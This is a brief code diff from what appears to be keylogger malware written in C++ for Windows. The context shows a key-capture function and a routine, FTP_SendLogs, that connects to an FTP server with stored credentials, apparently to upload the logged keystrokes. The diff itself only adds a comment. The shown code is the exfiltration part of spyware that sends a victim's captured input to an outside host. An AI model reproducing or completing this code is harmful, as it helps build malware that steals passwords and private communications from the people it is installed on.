@@ -451,6 +451,7 @@ bool CaptureKeys(int key)
 
 void FTP_SendLogs()
 {
+    // connect to FTP server
     HINTERNET InternetConnection = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     HINTERNET ftpSession = InternetConnectA(InternetConnection, FTP_SERVER.data(), INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME.data(), FTP_PASSWORD.data(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
 
